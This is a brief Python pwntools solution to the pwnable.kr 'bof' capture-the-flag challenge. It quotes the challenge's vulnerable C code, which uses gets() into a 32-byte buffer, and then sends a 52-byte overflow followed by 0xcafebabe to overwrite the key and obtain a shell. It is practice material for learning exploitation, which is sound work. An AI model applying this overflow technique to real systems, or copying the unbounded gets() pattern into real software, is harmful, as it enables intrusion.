# ssh bof@pwnable.kr -p2222 (pw: guest)
"""
bof binary is running at "nc 0 9000" under bof_pwn privilege. get shell and read flag

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	// smash me!
	if(key == 0xcafebabe){
		setregid(getegid(), getegid());
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
"""

from pwn import *

ssh = ssh('bof', 'pwnable.kr', 2222, 'guest')

# sh = ssh.process(['bof'])
# 连接到本地的 9000 端口
sh = ssh.remote("0", 9000)

count = 52
magic = 0xcafebabe
payload = b"a"*count + p32(magic)
print(f"payload: {payload}")

sh.sendline(payload)
sh.interactive()
# id
# ls